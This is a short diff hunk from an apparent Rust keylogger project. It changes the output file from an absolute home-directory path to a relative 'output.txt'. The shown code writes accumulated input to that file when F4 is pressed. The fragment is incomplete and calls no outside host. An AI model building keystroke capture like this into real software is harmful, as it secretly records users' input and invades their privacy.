@@ -20,7 +20,7 @@ fn main() -> io::Result<()> {
     if event.event_type == EventType::KeyPress(Key::F4) {
         println!("Exiting...");
         let input_borrow = string.borrow();
-        let mut file = File::create("/home/quote/Coding/Rust/keylog/output.txt").expect("Failed to create file");
+        let mut file = File::create("output.txt").expect("Failed to create file");
         file.write_all(input_borrow.as_bytes()).expect("Failed to write to file");
         std::process::exit(0);
     }
